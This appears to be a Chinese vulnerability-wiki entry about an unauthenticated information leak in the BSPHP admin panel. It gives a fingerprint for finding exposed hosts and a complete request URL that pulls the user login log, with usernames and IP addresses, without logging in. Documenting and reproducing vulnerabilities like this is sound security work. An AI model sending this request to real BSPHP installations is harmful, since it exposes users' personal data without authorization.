---
title: "BSPHP index.php 未授权访问 信息泄露漏洞"
date: 2026-10-12 09:00:04
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "BSPHP"
tags:
  - "BSPHP"
  - "未授权访问"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息

## 漏洞影响

```
BSPHP
```

## 网络测绘

```
"BSPHP"
```

## 漏洞复现

访问如下URL，泄露用户名与登录IP

```plain
http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162317323.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/BSPHP-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
